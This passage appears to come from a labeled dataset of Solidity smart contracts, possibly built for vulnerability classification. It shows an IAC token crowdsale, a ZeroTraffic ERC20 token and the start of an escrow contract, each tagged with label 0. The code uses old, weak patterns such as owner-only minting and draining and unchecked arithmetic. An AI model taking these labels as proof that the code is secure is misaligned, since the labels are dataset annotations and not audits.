\/**\r\r\n     * @dev Constuctor of the contract\r\r\n     *\r\r\n     *\/\r\r\n    function Crowdsale() public {\r\r\n        address _metadataContractAddr = 0x8A8473E51D7f562ea773A019d7351A96c419B633;\r\r\n        startBlock = 0;\r\r\n        endBlock = 0;\r\r\n        crowdSaleType = 1;\r\r\n        totalSupply = maxCapEcosystem;\r\r\n        crowdsaleStatus=0;\r\r\n        coinbase = 0xA84196972d6b5796cE523f861CC9E367F739421F;\r\r\n        owner = msg.sender;\r\r\n        totalSupplyFromInventory=0;\r\r\n        totalRemainInInventory = maxCapCompanyInventory;\r\r\n        getPrice = 2778;\r\r\n        objMetada = Metadata(_metadataContractAddr);\r\r\n        ecosystemContractAddress = objMetada.getAddress(ecosystemContractID);\r\r\n        assert(ecosystemContractAddress != address(0));\r\r\n        objEcosystem = Ecosystem(ecosystemContractAddress);\r\r\n        objMetada.addAddress(crowdsaleContractID, this);\r\r\n        balances[ecosystemContractAddress] = maxCapEcosystem;\r\r\n        targetToAchieve = (50000*100e18)\/(12*getPrice);\r\r\n    }\r\r\n\r\r\n    \/\/Verify if the sender is owner\r\r\n    modifier onlyOwner() {\r\r\n      require(msg.sender == owner);\r\r\n      _;\r\r\n    }\r\r\n\r\r\n    \/\/Modifier to make sure transaction is happening during sale when it is not stopped\r\r\n    modifier respectTimeFrame() {\r\r\n      \/\/ When contract is deployed, startblock is 0. When sale is started, startBlock should not be zero\r\r\n      assert(startBlock != 0 && !stopped && crowdsaleStatus == 1);\r\r\n      \/\/check if requirest is made after time is up\r\r\n      if(now > endBlock){\r\r\n          \/\/tokens cannot be bought after time is up\r\r\n          revert();\r\r\n      }\r\r\n      _;\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n     * @dev To upgrade ecosystem contract\r\r\n     *\r\r\n     *\/\r\r\n    function SetEcosystemContract () public onlyOwner {\r\r\n        uint256 balanceOfOldEcosystem = balances[ecosystemContractAddress];\r\r\n        balances[ecosystemContractAddress] = 0;\r\r\n        \/\/find new address of contract from metadata\r\r\n        ecosystemContractAddress = objMetada.getAddress(ecosystemContractID);\r\r\n        \/\/update the balance of new contract\r\r\n        balances[ecosystemContractAddress] = balanceOfOldEcosystem;\r\r\n        assert(ecosystemContractAddress != address(0));\r\r\n        objEcosystem = Ecosystem(ecosystemContractAddress);\r\r\n    }\r\r\n\r\r\n    function GetIACFundAccount() internal view returns (address) {\r\r\n        uint remainder = block.number%10;\r\r\n        if(remainder==0){\r\r\n            return 0x8786DB52D292551f4139a963F79Ce1018d909655;\r\r\n        } else if(remainder==1){\r\r\n            return 0x11818E22CDc0592F69a22b30CF0182888f315FBC;\r\r\n        } else if(remainder==2){\r\r\n            return 0x17616b652C3c2eAf2aa82a72Bd2b3cFf40A854fE;\r\r\n        } else if(remainder==3){\r\r\n            return 0xD433632CA5cAFDa27655b8E536E5c6335343d408;\r\r\n        } else if(remainder==4){\r\r\n            return 0xb0Dc59A8312D901C250f8975E4d99eAB74D79484;\r\r\n        } else if(remainder==5){\r\r\n            return 0x0e6B1F7955EF525C2707799963318c49f9Ad7374;\r\r\n        } else if(remainder==6){\r\r\n            return 0x2fE6C4D2DC0EB71d2ac885F64f029CE78b9F98d9;\r\r\n        } else if(remainder==7){\r\r\n            return 0x0a7cD1cCc55191F8046D1023340bdfdfa475F267;\r\r\n        } else if(remainder==8){\r\r\n            return 0x76C40fDFd3284da796851611e7e9e8De0CcA546C;\r\r\n        }else {\r\r\n            return 0xe4FE5295772997272914447549D570882423A227;\r\r\n        }\r\r\n  }\r\r\n    \/*\r\r\n    * To start Crowdsale\r\r\n    *\/\r\r\n    function startSale() public onlyOwner {\r\r\n        assert(startBlock == 0);\r\r\n        \/\/record timestamp when sale is started\r\r\n        startBlock = now;\r\r\n        \/\/change the type of sale to crowdsale\r\r\n        crowdSaleType = 1;\r\r\n        \/\/Change status of crowdsale to running\r\r\n        crowdsaleStatus = 1;\r\r\n        \/\/Crowdsale should end after its proper duration when started\r\r\n        endBlock = now.Add(durationCrowdSale);\r\r\n        \/\/Emit event when crowdsale state changes\r\r\n        StateChanged(true);\r\r\n    }\r\r\n\r\r\n    \/*\r\r\n    * To start crowdsale after 2 years(gapInPrimaryCrowdsaleAndSecondaryCrowdsale)\r\r\n    *\/\r\r\n    function startSecondaryCrowdsale (uint256 durationSecondaryCrowdSale) public onlyOwner {\r\r\n      \/\/crowdsale should have been stopped\r\r\n      \/\/startBlock should have a value. It show that sale was started at some point of time\r\r\n      \/\/endBlock > the duration of crowdsale: this ensures endblock was updated by finalize\r\r\n      assert(crowdsaleStatus == 2 && crowdSaleType == 1);\r\r\n      if(now > endBlock.Add(gapInPrimaryCrowdsaleAndSecondaryCrowdsale)){\r\r\n          \/\/crowdsale status set to \"running\"\r\r\n          crowdsaleStatus = 1;\r\r\n          \/\/change the type of CrowdSale\r\r\n          crowdSaleType = 2;\r\r\n          \/\/Duration is received in days\r\r\n          endBlock = now.Add(durationSecondaryCrowdSale * 86400);\r\r\n          \/\/Emit event when crowdsale state changes\r\r\n          StateChanged(true);\r\r\n      }\r\r\n      else\r\r\n        revert();\r\r\n    }\r\r\n    \r\r\n\r\r\n    \/*\r\r\n    * To set price for IAC Token per ether\r\r\n    *\/\r\r\n    function setPrice(uint _tokensPerEther) public onlyOwner\r\r\n    {\r\r\n        require( _tokensPerEther != 0);\r\r\n        getPrice = _tokensPerEther;\r\r\n        targetToAchieve = (50000*100e18)\/(12*_tokensPerEther);\r\r\n        \/\/Emit event when crowdsale state changes\r\r\n        StateChanged(true);\r\r\n    }\r\r\n\r\r\n    \/*\r\r\n    * To create and assign IAC Tokens to transaction initiator\r\r\n    *\/\r\r\n    function createTokens(address beneficiary) internal stopInEmergency  respectTimeFrame {\r\r\n        \/\/Make sure sent Eth is not 0\r\r\n        require(msg.value != 0);\r\r\n        \/\/Initially count without giving discount\r\r\n        uint256 iacToSend = (msg.value.Mul(getPrice))\/1e18;\r\r\n        \/\/calculate price to avail 50% discount\r\r\n        uint256 priceToAvail50PercentDiscount = numberOfTokensToAvail50PercentDiscount.Div(2*getPrice).Mul(1e18);\r\r\n        \/\/calculate price of tokens at 25% discount\r\r\n        uint256 priceToAvail25PercentDiscount = 3*numberOfTokensToAvail25percentDiscount.Div(4*getPrice).Mul(1e18);\r\r\n        \/\/Check if less than minimum number of tokens are bought\r\r\n        if(iacToSend < minimumNumberOfTokens){\r\r\n            revert();\r\r\n        }\r\r\n        else if(msg.value >= priceToAvail25PercentDiscount && msg.value < priceToAvail50PercentDiscount){\r\r\n            \/\/grant tokens according to 25% discount\r\r\n            iacToSend = (((msg.value.Mul(getPrice)).Mul(4)).Div(3))\/1e18;\r\r\n        }\r\r\n        \/\/check if user is eligible for 50% discount\r\r\n        else if(msg.value >= priceToAvail50PercentDiscount){\r\r\n            \/\/here tokens are given at 50% discount\r\r\n            iacToSend = (msg.value.Mul(2*getPrice))\/1e18;\r\r\n        }\r\r\n        \/\/default case: no discount\r\r\n        else {\r\r\n            iacToSend = (msg.value.Mul(getPrice))\/1e18;\r\r\n        }\r\r\n        \/\/we should not be supplying more tokens than maxCap\r\r\n        assert(iacToSend.Add(totalSupplyForCrowdsaleAndMint) <= maxCap);\r\r\n        \/\/increase totalSupply\r\r\n        totalSupply = totalSupply.Add(iacToSend);\r\r\n\r\r\n        totalSupplyForCrowdsaleAndMint = totalSupplyForCrowdsaleAndMint.Add(iacToSend);\r\r\n\r\r\n        if(ETHReceived < targetToAchieve){\r\r\n            \/\/transfer ether to coinbase account\r\r\n            coinbase.transfer(msg.value);\r\r\n        }\r\r\n        else{\r\r\n            GetIACFundAccount().transfer(msg.value);\r\r\n        }\r\r\n\r\r\n        \/\/store ETHReceived\r\r\n        ETHReceived = ETHReceived.Add(msg.value);\r\r\n        \/\/Emit event for contribution\r\r\n        ReceivedETH(beneficiary,ETHReceived);\r\r\n        balances[beneficiary] = balances[beneficiary].Add(iacToSend);\r\r\n\r\r\n        TokenSupplied(beneficiary, iacToSend, msg.value);\r\r\n        \/\/Emit event when crowdsale state changes\r\r\n        StateChanged(true);\r\r\n    }\r\r\n\r\r\n    \/*\r\r\n    * To enable owner to mint tokens\r\r\n    *\/\r\r\n    function MintAndTransferToken(address beneficiary,uint256 iacToCredit,bytes32 comment) external onlyOwner {\r\r\n        \/\/Available after the crowdsale is started\r\r\n        assert(crowdsaleStatus == 1 && beneficiary != address(0));\r\r\n        \/\/number of tokens to mint should be whole number\r\r\n        require(iacToCredit >= 1);\r\r\n        \/\/Check whether tokens are available or not\r\r\n        assert(totalSupplyForCrowdsaleAndMint <= maxCap);\r\r\n        \/\/Check whether the amount of token are available to transfer\r\r\n        require(totalSupplyForCrowdsaleAndMint.Add(iacToCredit) <= maxCap);\r\r\n        \/\/Update IAC Token balance for beneficiary\r\r\n        balances[beneficiary] = balances[beneficiary].Add(iacToCredit);\r\r\n        \/\/Update total supply for IAC Token\r\r\n        totalSupply = totalSupply.Add(iacToCredit);\r\r\n        totalSupplyForCrowdsaleAndMint = totalSupplyForCrowdsaleAndMint.Add(iacToCredit);\r\r\n        \/\/ send event for transferring IAC Token on offline payment\r\r\n        MintAndTransferIAC(beneficiary, iacToCredit, comment);\r\r\n        \/\/Emit event when crowdsale state changes\r\r\n        StateChanged(true);\r\r\n    }\r\r\n\r\r\n    \/*\r\r\n    * To enable transferring tokens from company inventory\r\r\n    *\/\r\r\n    function TransferFromCompanyInventory(address beneficiary,uint256 iacToCredit,bytes32 comment) external onlyOwner {\r\r\n        \/\/Available after the crowdsale is started\r\r\n        assert(startBlock != 0 && beneficiary != address(0));\r\r\n        \/\/Check whether tokens are available or not\r\r\n        assert(totalSupplyFromInventory <= maxCapCompanyInventory && !inventoryLocked);\r\r\n        \/\/number of tokens to transfer should be whole number\r\r\n        require(iacToCredit >= 1);\r\r\n        \/\/Check whether the amount of token are available to transfer\r\r\n        require(totalSupplyFromInventory.Add(iacToCredit) <= maxCapCompanyInventory);\r\r\n        \/\/Update IAC Token balance for beneficiary\r\r\n        balances[beneficiary] = balances[beneficiary].Add(iacToCredit);\r\r\n        \/\/Update total supply for IAC Token\r\r\n        totalSupplyFromInventory = totalSupplyFromInventory.Add(iacToCredit);\r\r\n        \/\/Update total supply for IAC Token\r\r\n        totalSupply = totalSupply.Add(iacToCredit);\r\r\n        \/\/total number of tokens remaining in inventory\r\r\n        totalRemainInInventory = totalRemainInInventory.Sub(iacToCredit);\r\r\n        \/\/send event for transferring IAC Token on offline payment\r\r\n        SuccessfullyTransferedFromCompanyInventory(beneficiary, iacToCredit, comment);\r\r\n        \/\/Emit event when crowdsale state changes\r\r\n        StateChanged(true);\r\r\n    }\r\r\n\r\r\n    function LockInventory () public onlyOwner {\r\r\n        require(startBlock > 0 && now >= startBlock.Add(durationCrowdSale.Add(90 days)) && !inventoryLocked);\r\r\n        address inventoryContractAddress = objMetada.getAddress(inventoryContractID);\r\r\n        require(inventoryContractAddress != address(0));\r\r\n        balances[inventoryContractAddress] = totalRemainInInventory;\r\r\n        totalSupply = totalSupply.Add(totalRemainInInventory);\r\r\n        objCompanyInventory = CompanyInventory(inventoryContractAddress);\r\r\n        objCompanyInventory.initiateLocking(totalSupplyFromInventory);\r\r\n        inventoryLocked = true;\r\r\n    }\r\r\n\r\r\n    \/*\r\r\n    * Finalize the crowdsale\r\r\n    *\/\r\r\n    function finalize() public onlyOwner {\r\r\n          \/\/Make sure Sale is running\r\r\n          \/\/finalize should be called only if crowdsale is running\r\r\n          assert(crowdsaleStatus == 1 && (crowdSaleType == 1 || crowdSaleType == 2));\r\r\n          \/\/finalize only if less than minimum number of tokens are left or if time is up\r\r\n          assert(maxCap.Sub(totalSupplyForCrowdsaleAndMint) < minimumNumberOfTokens || now >= endBlock);\r\r\n          \/\/crowdsale is ended\r\r\n          crowdsaleStatus = 2;\r\r\n          \/\/update endBlock to the actual ending of crowdsale\r\r\n          endBlock = now;\r\r\n          \/\/Emit event when crowdsale state changes\r\r\n          StateChanged(true);\r\r\n    }\r\r\n\r\r\n    \/*\r\r\n    * To enable transfers of IAC Token anytime owner wishes\r\r\n    *\/\r\r\n    function unlock() public onlyOwner\r\r\n    {\r\r\n        \/\/unlock will happen after 90 days of ending of crowdsale\r\r\n        \/\/crowdsale itself being of 25 days\r\r\n        assert(crowdsaleStatus==2 && now >= startBlock.Add(durationCrowdSale.Add(90 days)));\r\r\n        locked = false;\r\r\n        \/\/Emit event when crowdsale state changes\r\r\n        StateChanged(true);\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n     * @dev payable function to accept ether.\r\r\n     *\r\r\n     *\/\r\r\n    function () public payable {\r\r\n        createTokens(msg.sender);\r\r\n    }\r\r\n\r\r\n   \/*\r\r\n    * Failsafe drain\r\r\n    *\/\r\r\n   function drain() public  onlyOwner {\r\r\n        GetIACFundAccount().transfer(this.balance);\r\r\n  }\r\r\n}","label":0}
{"code":"pragma solidity ^0.4.15;\r\r\n\r\r\ncontract Owned {\r\r\n\r\r\n    \/\/ The address of the account that is the current owner \r\r\n    address public owner;\r\r\n\r\r\n    \/\/ The publiser is the inital owner\r\r\n    function Owned() {\r\r\n        owner = msg.sender;\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n     * Access is restricted to the current owner\r\r\n     *\/\r\r\n    modifier onlyOwner() {\r\r\n        require(msg.sender == owner);\r\r\n        _;\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n     * Transfer ownership to `_newOwner`\r\r\n     *\r\r\n     * @param _newOwner The address of the account that will become the new owner \r\r\n     *\/\r\r\n    function transferOwnership(address _newOwner) onlyOwner {\r\r\n        owner = _newOwner;\r\r\n    }\r\r\n}\r\r\n\r\r\n\/\/ Abstract contract for the full ERC 20 Token standard\r\r\n\/\/ https:\/\/github.com\/ethereum\/EIPs\/issues\/20\r\r\ncontract Token {\r\r\n    \/* This is a slight change to the ERC20 base standard.\r\r\n    function totalSupply() constant returns (uint256 supply);\r\r\n    is replaced with:\r\r\n    uint256 public totalSupply;\r\r\n    This automatically creates a getter function for the totalSupply.\r\r\n    This is moved to the base contract since public getter functions are not\r\r\n    currently recognised as an implementation of the matching abstract\r\r\n    function by the compiler.\r\r\n    *\/\r\r\n    \/\/\/ total amount of tokens\r\r\n    uint256 public totalSupply;\r\r\n\r\r\n    \/\/\/ @param _owner The address from which the balance will be retrieved\r\r\n    \/\/\/ @return The balance\r\r\n    function balanceOf(address _owner) constant returns (uint256 balance);\r\r\n\r\r\n    \/\/\/ @notice send `_value` token to `_to` from `msg.sender`\r\r\n    \/\/\/ @param _to The address of the recipient\r\r\n    \/\/\/ @param _value The amount of token to be transferred\r\r\n    \/\/\/ @return Whether the transfer was successful or not\r\r\n    function transfer(address _to, uint256 _value) returns (bool success);\r\r\n\r\r\n    \/\/\/ @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\r\n    \/\/\/ @param _from The address of the sender\r\r\n    \/\/\/ @param _to The address of the recipient\r\r\n    \/\/\/ @param _value The amount of token to be transferred\r\r\n    \/\/\/ @return Whether the transfer was successful or not\r\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\r\r\n\r\r\n    \/\/\/ @notice `msg.sender` approves `_spender` to spend `_value` tokens\r\r\n    \/\/\/ @param _spender The address of the account able to transfer the tokens\r\r\n    \/\/\/ @param _value The amount of tokens to be approved for transfer\r\r\n    \/\/\/ @return Whether the approval was successful or not\r\r\n    function approve(address _spender, uint256 _value) returns (bool success);\r\r\n\r\r\n    \/\/\/ @param _owner The address of the account owning tokens\r\r\n    \/\/\/ @param _spender The address of the account able to transfer the tokens\r\r\n    \/\/\/ @return Amount of remaining tokens allowed to spent\r\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining);\r\r\n\r\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\r\n}\r\r\n\r\r\n\/**\r\r\n * Implements ERC 20 Token standard: https:\/\/github.com\/ethereum\/EIPs\/issues\/20\r\r\n *\r\r\n * Modified version of https:\/\/github.com\/ConsenSys\/Tokens that implements the \r\r\n * original Token contract, an abstract contract for the full ERC 20 Token standard\r\r\n *\/\r\r\ncontract StandardToken is Token {\r\r\n\r\r\n\r\r\n    \/**\r\r\n     * ERC20 Short Address Attack fix\r\r\n     *\/\r\r\n    modifier onlyPayloadSize(uint numArgs) {\r\r\n        assert(msg.data.length == numArgs * 32 + 4);\r\r\n        _;\r\r\n    }\r\r\n\r\r\n\r\r\n    \/\/ ZTT token balances\r\r\n    mapping (address => uint256) balances;\r\r\n\r\r\n    \/\/ ZTT token allowances\r\r\n    mapping (address => mapping (address => uint256)) allowed;\r\r\n    \r\r\n\r\r\n    \/** \r\r\n     * Get balance of `_owner` \r\r\n     * \r\r\n     * @param _owner The address from which the balance will be retrieved\r\r\n     * @return The balance\r\r\n     *\/\r\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\r\n        return balances[_owner];\r\r\n    }\r\r\n\r\r\n\r\r\n    \/** \r\r\n     * Send `_value` token to `_to` from `msg.sender`\r\r\n     * \r\r\n     * @param _to The address of the recipient\r\r\n     * @param _value The amount of token to be transferred\r\r\n     * @return Whether the transfer was successful or not\r\r\n     *\/\r\r\n    function transfer(address _to, uint256 _value) onlyPayloadSize(2) returns (bool success) {\r\r\n\r\r\n        \/\/ Check if the sender has enough tokens\r\r\n        require(balances[msg.sender] >= _value);   \r\r\n\r\r\n        \/\/ Check for overflows\r\r\n        require(balances[_to] + _value > balances[_to]);\r\r\n\r\r\n        \/\/ Transfer tokens\r\r\n        balances[msg.sender] -= _value;\r\r\n        balances[_to] += _value;\r\r\n\r\r\n        \/\/ Notify listners\r\r\n        Transfer(msg.sender, _to, _value);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n\r\r\n    \/** \r\r\n     * Send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\r\n     * \r\r\n     * @param _from The address of the sender\r\r\n     * @param _to The address of the recipient\r\r\n     * @param _value The amount of token to be transferred\r\r\n     * @return Whether the transfer was successful or not\r\r\n     *\/\r\r\n    function transferFrom(address _from, address _to, uint256 _value) onlyPayloadSize(3) returns (bool success) {\r\r\n\r\r\n        \/\/ Check if the sender has enough\r\r\n        require(balances[_from] >= _value);\r\r\n\r\r\n        \/\/ Check for overflows\r\r\n        require(balances[_to] + _value > balances[_to]);\r\r\n\r\r\n        \/\/ Check allowance\r\r\n        require(_value <= allowed[_from][msg.sender]);\r\r\n\r\r\n        \/\/ Transfer tokens\r\r\n        balances[_to] += _value;\r\r\n        balances[_from] -= _value;\r\r\n\r\r\n        \/\/ Update allowance\r\r\n        allowed[_from][msg.sender] -= _value;\r\r\n\r\r\n        \/\/ Notify listners\r\r\n        Transfer(_from, _to, _value);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n\r\r\n    \/** \r\r\n     * `msg.sender` approves `_spender` to spend `_value` tokens\r\r\n     * \r\r\n     * @param _spender The address of the account able to transfer the tokens\r\r\n     * @param _value The amount of tokens to be approved for transfer\r\r\n     * @return Whether the approval was successful or not\r\r\n     *\/\r\r\n    function approve(address _spender, uint256 _value) onlyPayloadSize(2) returns (bool success) {\r\r\n\r\r\n        \/\/ Update allowance\r\r\n        allowed[msg.sender][_spender] = _value;\r\r\n\r\r\n        \/\/ Notify listners\r\r\n        Approval(msg.sender, _spender, _value);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n\r\r\n    \/** \r\r\n     * Get the amount of remaining tokens that `_spender` is allowed to spend from `_owner`\r\r\n     * \r\r\n     * @param _owner The address of the account owning tokens\r\r\n     * @param _spender The address of the account able to transfer the tokens\r\r\n     * @return Amount of remaining tokens allowed to spent\r\r\n     *\/\r\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\r\n      return allowed[_owner][_spender];\r\r\n    }\r\r\n}\r\r\n\r\r\n\/**\r\r\n * @title ZTT (ZeroTraffic) token\r\r\n *\r\r\n * Implements ERC 20 Token standard: https:\/\/github.com\/ethereum\/EIPs\/issues\/20 with the addition \r\r\n * of ownership, a lock and issuing.\r\r\n *\r\r\n * #created 29\/08\/2017\r\r\n * #author Frank Bonnet\r\r\n *\/\r\r\ncontract ZTToken is Owned, StandardToken {\r\r\n\r\r\n    \/\/ Ethereum token standard\r\r\n    string public standard = \"Token 0.2\";\r\r\n\r\r\n    \/\/ Full name\r\r\n    string public name = \"ZeroTraffic\";        \r\r\n    \r\r\n    \/\/ Symbol\r\r\n    string public symbol = \"ZTT\";\r\r\n\r\r\n    \/\/ No decimal points\r\r\n    uint8 public decimals = 8;\r\r\n\r\r\n    \/\/ Core team insentive distribution\r\r\n    bool public incentiveDistributed = false;\r\r\n    uint256 public incentiveDistributionDate = 0;\r\r\n    uint256 public incentiveDistributionInterval = 2 years;\r\r\n    \r\r\n    \/\/ Core team incentives\r\r\n    struct Incentive {\r\r\n        address recipient;\r\r\n        uint8 percentage;\r\r\n    }\r\r\n\r\r\n    Incentive[] public incentives;\r\r\n    \r\r\n\r\r\n    \/**\r\r\n     * Starts with a total supply of zero and the creator starts with \r\r\n     * zero tokens (just like everyone else)\r\r\n     *\/\r\r\n    function ZTToken() {  \r\r\n        balances[msg.sender] = 0;\r\r\n        totalSupply = 0;\r\r\n        incentiveDistributionDate = now + incentiveDistributionInterval;\r\r\n        incentives.push(Incentive(0x3cAf983aCCccc2551195e0809B7824DA6FDe4EC8, 1)); \/\/ 0.01 * 10^2 Frank Bonnet\r\r\n    }\r\r\n\r\r\n\r\r\n    \/**\r\r\n     * Distributes incentives over the core team members as \r\r\n     * described in the whitepaper\r\r\n     *\/\r\r\n    function withdrawIncentives() {\r\r\n        require(!incentiveDistributed);\r\r\n        require(now > incentiveDistributionDate);\r\r\n\r\r\n        incentiveDistributed = true;\r\r\n\r\r\n        uint256 totalSupplyToDate = totalSupply;\r\r\n        for (uint256 i = 0; i < incentives.length; i++) {\r\r\n\r\r\n            \/\/ totalSupplyToDate * (percentage * 10^2) \/ 10^2 \/ denominator\r\r\n            uint256 amount = totalSupplyToDate * incentives[i].percentage \/ 10**2; \r\r\n            address recipient = incentives[i].recipient;\r\r\n\r\r\n            \/\/ Create tokens\r\r\n            balances[recipient] += amount;\r\r\n            totalSupply += amount;\r\r\n\r\r\n            \/\/ Notify listners\r\r\n            Transfer(0, this, amount);\r\r\n            Transfer(this, recipient, amount);\r\r\n        }\r\r\n    }\r\r\n\r\r\n\r\r\n    \/**\r\r\n     * Issues `_value` new tokens to `_recipient` (_value < 0 guarantees that tokens are never removed)\r\r\n     *\r\r\n     * @param _recipient The address to which the tokens will be issued\r\r\n     * @param _value The amount of new tokens to issue\r\r\n     * @return Whether the approval was successful or not\r\r\n     *\/\r\r\n    function issue(address _recipient, uint256 _value) onlyOwner onlyPayloadSize(2) returns (bool success) {\r\r\n\r\r\n        \/\/ Guarantee positive \r\r\n        require(_value > 0);\r\r\n\r\r\n        \/\/ Create tokens\r\r\n        balances[_recipient] += _value;\r\r\n        totalSupply += _value;\r\r\n\r\r\n        \/\/ Notify listners \r\r\n        Transfer(0, owner, _value);\r\r\n        Transfer(owner, _recipient, _value);\r\r\n\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n\r\r\n    \/**\r\r\n     * Prevents accidental sending of ether\r\r\n     *\/\r\r\n    function () {\r\r\n        revert();\r\r\n    }\r\r\n}","label":0}
{"code":"pragma solidity ^0.4.18;\r\r\ncontract Token {\r\r\n    function transfer(address _to, uint _value) public returns (bool success);\r\r\n    function transferFrom(address _from, address _to, uint _value) public returns (bool success);\r\r\n    function approve(address _spender, uint _value) public returns (bool success);\r\r\n}\r\r\ncontract LocalEthereumEscrows {\r\r\n    \/\/ The address of the arbitrator\r\r\n    \/\/ In the first version, this is always localethereum staff.\r\r\n    address public arbitrator;\r\r\n    address public owner;\r\r\n    address public relayer;\r\r\n    uint32 public requestCancellationMinimumTime;\r\r\n    uint256 public feesAvailableForWithdraw;\r\r\n\r\r\n    uint8 constant ACTION_SELLER_CANNOT_CANCEL = 0x01; \/\/ Called when marking as paid or calling a dispute as the buyer\r\r\n    uint8 constant ACTION_BUYER_CANCEL = 0x02;\r\r\n    uint8 constant ACTION_SELLER_CANCEL = 0x03;\r\r\n    uint8 constant ACTION_SELLER_REQUEST_CANCEL = 0x04;\r\r\n    uint8 constant ACTION_RELEASE = 0x05;\r\r\n    uint8 constant ACTION_DISPUTE = 0x06;\r\r\n\r\r\n    event Created(bytes32 _tradeHash);\r\r\n    event SellerCancelDisabled(bytes32 _tradeHash);\r\r\n    event SellerRequestedCancel(bytes32 _tradeHash);\r\r\n    event CancelledBySeller(bytes32 _tradeHash);\r\r\n    event CancelledByBuyer(bytes32 _tradeHash);\r\r\n    event Released(bytes32 _tradeHash);\r\r\n    event DisputeResolved(bytes32 _tradeHash);\r\r\n\r\r\n    struct Escrow {\r\r\n        \/\/ Set so we know the trade has already been created\r\r\n        bool exists;\r\r\n        \/\/ The timestamp in which the seller can cancel the trade if the buyer has not yet marked as paid. Set to 0 on marked paid or dispute\r\r\n        \/\/ 1 = unlimited cancel time\r\r\n        uint32 sellerCanCancelAfter;\r\r\n        \/\/ The total cost of gas spent by relaying parties. This amount will be\r\r\n        \/\/ refunded\/paid to localethereum.com once the escrow is finished.\r\r\n        uint128 totalGasFeesSpentByRelayer;\r\r\n    }\r\r\n    \/\/ Mapping of active trades. Key is a hash of the trade data\r\r\n    mapping (bytes32 => Escrow) public escrows;\r\r\n\r\r\n    modifier onlyOwner() {\r\r\n        require(msg.sender == owner);\r\r\n        _;\r\r\n    }\r\r\n\r\r\n    modifier onlyArbitrator() {\r\r\n        require(msg.sender == arbitrator);\r\r\n        _;\r\r\n    }\r\r\n\r\r\n    function getRelayedSender(\r\r\n      bytes16 _tradeID, \/\/ The unique ID of the trade, generated by localethereum.com\r\r\n      uint8 _actionByte, \/\/ The desired action of the user, matching an ACTION_* constant\r\r\n      uint128 _maximumGasPrice, \/\/ The maximum gas price the user is willing to pay\r\r\n      uint8 _v, \/\/ Signature value\r\r\n      bytes32 _r, \/\/ Signature value\r\r\n      bytes32 _s \/\/ Signature value\r\r\n    ) view private returns (address) {\r\r\n        bytes32 _hash = keccak256(_tradeID, _actionByte, _maximumGasPrice);\r\r\n        if(tx.gasprice > _maximumGasPrice) return;\r\r\n        return ecrecover(_hash, _v, _r, _s);\r\r\n    }\r\r\n\r\r\n    function LocalEthereumEscrows() public {\r\r\n        \/**\r\r\n         * Initialize the contract.\r\r\n         *\/\r\r\n        owner = msg.sender;\r\r\n        arbitrator = msg.sender;\r\r\n        relayer = msg.sender;\r\r\n        requestCancellationMinimumTime = 2 hours; \/\/ TODO\r\r\n    }\r\r\n\r\r\n    function getEscrowAndHash(\r\r\n      \/**\r\r\n       * Hashes the values and returns the matching escrow object and trade hash.\r\r\n       * Returns an empty escrow struct and 0 _tradeHash if not found\r\r\n       *\/\r\r\n      bytes16 _tradeID,\r\r\n      address _seller,\r\r\n      address _buyer,\r\r\n      uint256 _value,\r\r\n      uint16 _fee\r\r\n    ) view private returns (Escrow, bytes32) {\r\r\n        bytes32 _tradeHash = keccak256(_tradeID, _seller, _buyer, _value, _fee);\r\r\n        return (escrows[_tradeHash], _tradeHash);\r\r\n    }\r\r\n\r\r\n    function createEscrow(\r\r\n      \/**\r\r\n       * Create a new escrow and add it to `escrows`.\r\r\n       * _tradeHash is created by hashing _tradeID, _seller, _buyer, _value and _fee variables. These variables must be supplied on future contract calls.\r\r\n       * v, r and s is the signature data supplied from the api. The sig is keccak256(_tradeHash, _paymentWindowInSeconds, _expiry).\r\r\n       *\/\r\r\n      bytes16 _tradeID, \/\/ The unique ID of the trade, generated by localethereum.com\r\r\n      address _seller, \/\/ The selling party of the trade\r\r\n      address _buyer, \/\/ The buying party of the trade\r\r\n      uint256 _value, \/\/ The ether amount being held in escrow\r\r\n      uint16 _fee, \/\/ The localethereum.com fee in 1\/10000ths\r\r\n      uint32 _paymentWindowInSeconds, \/\/ The time in seconds from contract creation that the buyer has to mark as paid\r\r\n      uint32 _expiry, \/\/ Provided by localethereum.com. This transaction must be created before this time.\r\r\n      uint8 _v, \/\/ Signature value\r\r\n      bytes32 _r, \/\/ Signature value\r\r\n      bytes32 _s \/\/ Signature value\r\r\n    ) payable external {\r\r\n        bytes32 _tradeHash = keccak256(_tradeID, _seller, _buyer, _value, _fee);\r\r\n        require(!escrows[_tradeHash].exists); \/\/ Require that trade does not already exist\r\r\n        require(ecrecover(keccak256(_tradeHash, _paymentWindowInSeconds, _expiry), _v, _r, _s) == relayer); \/\/ Signature must have come from the relayer\r\r\n        require(block.timestamp < _expiry);\r\r\n        require(msg.value == _value && msg.value > 0); \/\/ Check sent eth against signed _value and make sure is not 0\r\r\n        uint32 _sellerCanCancelAfter = _paymentWindowInSeconds == 0 ? 1 : uint32(block.timestamp) + _paymentWindowInSeconds;\r\r\n        escrows[_tradeHash] = Escrow(true, _sellerCanCancelAfter, 0);\r\r\n        Created(_tradeHash);\r\r\n    }\r\r\n\r\r\n    uint16 constant GAS_doRelease = 36100;\r\r\n    function doRelease(\r\r\n      \/**\r\r\n       * Called by the seller to releases the funds for a successful trade.\r\r\n       * Deletes the trade from the `escrows` mapping.\r\r\n       *\/\r\r\n      bytes16 _tradeID,\r\r\n      address _seller,\r\r\n      address _buyer,\r\r\n      uint256 _value,\r\r\n      uint16 _fee,\r\r\n      uint128 _additionalGas\r\r\n    ) private returns (bool) {\r\r\n        var (_escrow, _tradeHash) = getEscrowAndHash(_tradeID, _seller, _buyer, _value, _fee);\r\r\n        if (!_escrow.exists) return false;\r\r\n        uint128 _gasFees = 